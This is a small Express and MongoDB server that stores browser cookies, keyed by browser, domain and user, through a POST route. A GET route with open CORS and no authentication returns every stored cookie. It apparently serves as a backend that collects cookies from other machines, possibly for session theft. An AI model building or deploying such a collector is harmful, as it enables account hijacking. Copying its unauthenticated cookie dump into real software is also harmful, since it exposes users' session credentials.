//TODO: TEST API
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const dotenv = require('dotenv');

dotenv.config();
const env = process.env;

const PORT = 4000;
const app = express();

app.use(cors());
app.use(express.json());

//* Model
const cookieSchema = new mongoose.Schema({
    browser: {
        type: String,
        required: true
    },
    domain: {
        type: String,
        required: true
    },
    cookieData: {
        type: Object,
        required: true
    },
    user: {
        type: String,
        required: true
    },
});

const Cookie = mongoose.model('Cookie', cookieSchema);

mongoose.connect(env.DB_URI)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Could not connect to MongoDB', err));


//* Routes
//! POST
app.post('/api/create', async (req, res) => {
    try {
        const domain = req.body.domain;
        const cookieData = req.body.cookieData;
        const user = req.body.user;
        const browser = req.body.browser;
        const newCookie = new Cookie({
            browser: browser,
            domain: domain,
            cookieData: cookieData,
            user: user,
        });
        const cookieStatus = await newCookie.save();
        if (cookieStatus) {
            console.log("uploaded cookie");
            return res
                .status(201)
                .json({ success: true, message: 'Cookie created successfully' });
        } else {
            return res
                .status(500)
                .json({ success: false, message: 'Failed to create cookie' });
        }
    } catch (error) {
        return res
            .status(400)
            .json({ success: false, message: error });
    }
});

//! GET
app.get('/api/get', async (req, res) => {
    try {
        const cookieFinder = await Cookie.find();
        return res
            .status(200)
            .json(cookieFinder);
    } catch (error) {
        return res
            .status(400)
            .json({ success: false, message: 'DB Error' });
    }
});


app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`http://localhost:${PORT}/`);
});